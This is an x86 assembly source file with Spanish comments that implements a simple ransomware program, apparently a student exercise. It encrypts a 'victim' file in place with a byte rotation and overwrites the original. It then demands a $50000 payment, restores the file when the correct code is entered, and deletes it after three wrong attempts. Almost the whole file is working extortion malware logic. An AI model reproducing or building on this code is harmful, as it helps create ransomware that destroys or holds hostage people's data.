GLOBAL main

section .data
    archVictima DB "archivoV.txt", 0
    mensaje_pago db 10,10,10,"Realice el pago de $50000: $",0
    tam_pago equ $ - mensaje_pago

    mensaje_codigo db 10,10,"El codigo para recuperar tu informacion es ->1234<- ",10,10,0
    tam_mensajeC equ $ -mensaje_codigo

    mensaje_ingreso db 10,"->Ingresa el código:-> ", 0
    tam_mensaje equ $ - mensaje_ingreso

    mensaje_correcto db " ¡Código correcto! ", 10,0
    tam_correct equ $ - mensaje_correcto

    mensaje_error db 10,"Código incorrecto!!!!",10, 0
    tam_err equ $ - mensaje_error

    mensaje_eliminar db 10,"!!ELIMINANDO EL ARCHIVO!! ", 10, 0
    tam_elim equ $ - mensaje_eliminar

    mensaje_errElim db 10,"----->ERROR<-----", 10, 0
    tam_errElim equ $ - mensaje_errElim
    

    espacio db " "
    tama_buffer EQU 70
    tama_buffer1 EQU 70
    key DD 4
    dinero DD "50000"
    codigo_correcto db "1234"
    intentos_correctos DD 0
    postfixExpr DD 0

section .bss
    fd_lectura resw 1
    fd_cifrado resw 1
    fd_codigo resw 1
    buffer resb tama_buffer
    buffer2 resb tama_buffer
section .text 

    ;->INICIOO<-
    main:
        ;Abrimos el archivo de lectura
        mov eax, 5              ;sys_open
        mov ebx, archVictima
        mov ecx, 0            ;El archivo se abrira en modo lectura
        mov edx, 777              ;Cuenta con todos los permisos rwx
        int 0x80

        mov [fd_lectura], eax   ;Guardamos el identificador de archivo de lectura


        ;Leer el contenido del archivo
        mov eax, 3
        mov ebx, [fd_lectura]
        mov ecx, buffer
        mov edx, tama_buffer
        int 0x80                ;Aqui basicamente Leemos contenido del archivo

        ;Cifrar contenido
        mov esi, buffer        ;Puntero al inicio del buffer
        mov ecx, 0          ;Contador de posición inicializado en 0


    ;->INICIO PARA EL CIFRADO DEL CONTENIDO DEL ARCHIVO<-
    cifrar_loop:
        movzx eax, byte [esi]  ;Cargamos el caracter actual en AL
        cmp al, 0              ;Verificamos si se llegó al final del archivo
        je fin_cifrar          ;De ser el final del archivo, salta a fin_cifrar

        cmp al, [espacio]
        je incrementos_cifrado

        mov cl, byte [key]     ;Cargmos el valor de "key" en CL
        ror al, cl             ;Rotamos a la derecha el valor de AL según CL->cl tiene un 3


        mov [esi], al    ;Guardamos el caracter cifrado en el buffer
        jmp incrementos_cifrado

        

    ;->IMPRESION EN CONSOLA DEL CONTENIDO CIFRADO, ELIMINANDO EL CONTENIDO ACTUAL Y SOBREESCRIBIENDO YA EL CONTENIDO CIFRADO<-
    fin_cifrar:
        ;Cerramos el archivo de lectura
        mov eax, 6              ;sys_close
        mov ebx, [fd_lectura]
        int 0x80

        ;->IMPRESION EN CONSOLA DEL CONTENIDO CIFRADO<-
        mov eax, 4              ;Identificador de la llamada al sistema ESCRITURA
        mov ebx, 1              ;Descriptor de archivo para la salida estándar
        mov ecx, buffer         ;Apuntador al mensaje (dirección de memoria)
        mov edx, tama_buffer   ;Tamaño del mensaje
        int 0x80                ;Llamada al sistema


        ;Abrimos el archivo de escritura (archivo original)
        mov eax, 5              ; sys_open
        mov ebx, archVictima
        mov ecx, 641            ; Modo de escritura, crear si no existe, permisos 641
        mov edx, 777            ; Asignando todos los permisos
        int 0x80

        mov [fd_lectura], eax   ; Guardamos el identificador de archivo de escritura


        ;BORRAR CONTENIDO DEL ARCHIVO
        mov eax, 92           ; Número de función para truncar archivo (truncate)
        mov ebx, eax          ; El descriptor de archivo se encuentra en eax
        int 0x80              ; Llamada al sistema

        mov eax, 6              ;sys_close
        mov ebx, [fd_lectura]
        int 0x80


        ; Abrimos el archivo de escritura (archivo original)
        mov eax, 5              ; sys_open
        mov ebx, archVictima
        mov ecx, 641            ; Modo de escritura, crear si no existe, permisos 641
        mov edx, 777            ; Asignando todos los permisos
        int 0x80

        mov [fd_lectura], eax   ; Guardamos el identificador de archivo de escritura

        ;->Escribiendo el contenido cifrado en el archivo original<-
        mov eax, 4              ; sys_write
        mov ebx, [fd_lectura]
        mov ecx, buffer
        mov edx, tama_buffer
        int 0x80                ; Escribimos el contenido cifrado en el archivo original

        ;Cerramos el archivo original
        mov eax, 6              ; sys_close
        mov ebx, [fd_lectura]
        int 0x80

        ;jmp Pedir_codigo  

    Pago:
        ;mostramos el mensaje para que se realice el pago
        mov eax, 4               ; sys_write
        mov ebx, 1               ; Descriptor de archivo para la salida estándar (stdout)
        mov ecx, mensaje_pago ; Apuntador al mensaje "Ingresa el código"
        mov edx, tam_pago     ; Tamaño del mensaje
        int 0x80                 ; Llamada al sistema

        ; Solicitar código al usuario
        mov eax, 3               ; sys_read
        mov ebx, 0               ; Descriptor de archivo para la entrada estándar (stdin)
        mov ecx, buffer2         ; Apuntador al búfer para almacenar la entrada
        mov edx, tama_buffer    ; Tamaño máximo de lectura
        int 0x80                 ; Llamada al sistema

        ;para comprobar si se ingresa algo o no 
        cmp eax,1
        jle Pago

        ; Comparar código ingresado con el código correcto
        mov eax,[buffer2]
        cmp eax,[dinero]
        je Pedir_codigo    ; Si el pago es aceptado, saltar a la etiqueta "codigo_correcto"
        jne Pago


   ;-------
    Pedir_codigo:
        ;Mostrar mensaje con el codigo correcto
        mov eax, 4               ; sys_write
        mov ebx, 1               ; Descriptor de archivo para la salida estándar (stdout)
        mov ecx, mensaje_codigo ; Apuntador al mensaje "Ingresa el código"
        mov edx, tam_mensajeC    ; Tamaño del mensaje
        int 0x80                 ; Llamada al sistema

            ; Mostrar mensaje "Ingresa el código"
        mov eax, 4               ; sys_write
        mov ebx, 1               ; Descriptor de archivo para la salida estándar (stdout)
        mov ecx, mensaje_ingreso ; Apuntador al mensaje "Ingresa el código"
        mov edx, tam_mensaje     ; Tamaño del mensaje
        int 0x80                 ; Llamada al sistema

        ; Solicitar código al usuario
        mov eax, 3               ; sys_read
        mov ebx, 0               ; Descriptor de archivo para la entrada estándar (stdin)
        mov ecx, buffer2         ; Apuntador al búfer para almacenar la entrada
        mov edx, tama_buffer1    ; Tamaño máximo de lectura
        int 0x80                 ; Llamada al sistema

        ;para comprobar si se ingresa algo o no 
        cmp eax,1
        jle Pedir_codigo

        ; Comparar código ingresado con el código correcto
        mov eax,[buffer2]
        cmp eax,[codigo_correcto]
        je correcto    ; Si el código es correcto, saltar a la etiqueta "codigo_correcto"
        jne codigo_Incorrecto



;->INICIO PARA EL DESCIFRADO DEL CONTENIDO DEL ARCHIVO<-
    descifrar_prueba:

        movzx eax, byte [esi]  ;Cargamos el caracter actual en AL
        cmp al, 0              ;VVerificamos si se llegó al final del archivo
        je fin_descifrar          ;De ser el final del archivo, salta a fin_cifrar

        cmp al, [espacio]
        je incrementos_descifrado

        mov cl, byte [key]     ;Cargmos el valor de "key" en CL
        rol al, cl             ;Rotamos a la derecha el valor de AL según CL->cl tiene un 3


        mov [esi], al    ;Guardamos el caracter cifrado en el buffer
        jmp incrementos_descifrado


    ;->IMPRESION EN CONSOLA DEL CONTENIDO DESCIFRADO, ELIMINANDO EL CONTENIDO ACTUAL Y SOBREESCRIBIENDO YA EL CONTENIDO DESCIFRADO<-
    fin_descifrar:
        ;Cerramos el archivo de lectura
        mov eax, 6              ;sys_close
        mov ebx, [fd_lectura]
        int 0x80
        

        ;->MUESTRA EL CONTENIDO DEL BUFFER<-
        mov eax, 4              ;Identificador de la llamada al sistema ESCRITURA
        mov ebx, 1              ;Descriptor de archivo para la salida estándar
        mov ecx, buffer         ;Apuntador al mensaje (dirección de memoria)
        mov edx, tama_buffer    ;Tamaño del mensaje
        int 0x80                ;Llamada al sistema



        ;Abrimos el archivo de escritura (archivo original)
        mov eax, 5              ; sys_open
        mov ebx, archVictima
        mov ecx, 641            ; Modo de escritura, crear si no existe, permisos 641
        mov edx, 777            ; Asignando todos los permisos
        int 0x80

        mov [fd_lectura], eax   ; Guardamos el identificador de archivo de escritura


        ;->BORRAR CONTENIDO DEL ARCHIVO<-
        mov eax, 92           ; Número de función para truncar archivo (truncate)
        mov ebx, eax          ; El descriptor de archivo se encuentra en eax
        int 0x80              ; Llamada al sistema

        mov eax, 6              ;sys_close
        mov ebx, [fd_lectura]
        int 0x80


        ; Abrimos el archivo de escritura (archivo original)
        mov eax, 5              ;sys_open
        mov ebx, archVictima
        mov ecx, 641            ;Modo de escritura, crear si no existe, permisos 641
        mov edx, 777            ;Asignando todos los permisos
        int 0x80

        mov [fd_lectura], eax   ;Guardamos el identificador de archivo de escritura

        ;Escribiendo el contenido descifrado en el archivo original
        mov eax, 4              ;sys_write
        mov ebx, [fd_lectura]
        mov ecx, buffer
        mov edx, tama_buffer
        int 0x80                ;Llamada al sistema

        ;Cierre del archivo original
        mov eax, 6              ; ys_close
        mov ebx, [fd_lectura]
        int 0x80

        mov eax, 1              ;Fin del programa
        int 0x80



    ;->INCREMENTOS PARA EL CIFRADO DEL MENSAJE<-
    incrementos_cifrado:
        inc esi               ;Avanzamos al siguiente caracter en el buffer
        inc ecx               ;Incrementamos el contador de posición

        cmp ecx, edx          ;Comparamos el contador con el tamaño del buffer
        jl cifrar_loop        ;Si no se ha llegado al final del buffer, continua en el ciclo
        jmp fin_cifrar

    


    ;->INCREMENTOS PARA EL DESCIFRADO DEL MENSAJE
    incrementos_descifrado:
        inc esi               ;Avanzamos al siguiente caracter en el buffer
        inc ecx               ;Incrementamos el contador de posición

        cmp ecx, edx          ;Comparamos el contador con el tamaño del buffer
        jl descifrar_prueba        ;Si no se ha llegado al final del buffer, continua en el ciclo
        jmp fin_descifrar



    ;->ABRIR EL ARCHIVO DE LA VICTIMA<-
    abrir_arch:
        ;Abrimos el archivo de lectura
        mov eax, 5              ;sys_open
        mov ebx, archVictima
        mov ecx, 0            ; El archivo se abrira en modo lectura
        mov edx, 777              ;Cuenta con todos los permisos rwx
        int 0x80

        mov [fd_lectura], eax   ;Guardamos el identificador de archivo de lectura


        ;Leer el contenido del archivo
        mov eax, 3
        mov ebx, [fd_lectura]
        mov ecx, buffer
        mov edx, tama_buffer
        int 0x80                ;Aqui basicamente Leemos contenido del archivo

        ;Descifrar contenido
        mov esi, buffer        ;Puntero al inicio del buffer
        mov ecx, 0          ;Contador de posición inicializado en 0

        jmp descifrar_prueba;Salto a descifrar pruba, que basicamente descifra el contenido del archivo
   
    eliminar_archivo:
        
        ; Mostrar mensaje "Eliminando archivo"
        mov eax, 4              ; sys_write
        mov ebx, 1              ; Descriptor de archivo para la salida estándar (stdout)
        mov ecx, mensaje_eliminar ; Apuntador al mensaje "Eliminando archivo"
        mov edx, tam_elim     ; Tamaño del mensaje
        int 0x80                ; Llamada al sistema


         ; Eliminar archivo si se ingresan 3 códigos erróneos
        mov eax, 80             ; sys_unlink (unlink)
        mov ebx, archVictima    ; Nombre del archivo a eliminar
        int 0x80                ; Llamada al sistema

        cmp eax, -1             ; Compara el valor de retorno con -1 (indicador de error)
        je error_eliminar       ; Salta a la etiqueta "error_eliminar" si se produjo un error

        ; Finalizar el programa
        mov eax, 1              ; sys_exit
        int 0x80


    correcto:
        mov eax, 4              ; sys_write
        mov ebx, 1              ; Descriptor de archivo para la salida estándar (stdout)
        mov ecx, mensaje_correcto   ; Apuntador al mensaje "Código incorrecto"
        mov edx, tam_correct      ; Tamaño del mensaje
        int 0x80                ; Llamada al sistema

        jmp abrir_arch

        ;mov eax,1
        ;int 0x80

    codigo_Incorrecto:
        ; Mostrar mensaje "Código incorrecto"
        mov eax, 4              ; sys_write
        mov ebx, 1              ; Descriptor de archivo para la salida estándar (stdout)
        mov ecx, mensaje_error   ; Apuntador al mensaje "Código incorrecto"
        mov edx, tam_err      ; Tamaño del mensaje
        int 0x80                ; Llamada al sistema



        ;Incrementar contador de intentos
        inc dword [intentos_correctos]
        cmp dword [intentos_correctos], 3
        jl Pedir_codigo         ; Si no se superan 3 intentos incorrectos, saltar a la etiqueta "Pedir_codigo"
        jmp eliminar_archivo
    
    error_eliminar:
         ;mostramos el mensaje para que se realice el pago
        mov eax, 4               ; sys_write
        mov ebx, 1               ; Descriptor de archivo para la salida estándar (stdout)
        mov ecx, mensaje_errElim; Apuntador al mensaje "Ingresa el código"
        mov edx, tam_errElim     ; Tamaño del mensaje
        int 0x80                 ; Llamada al sistema

        mov eax,1
        int 0x80

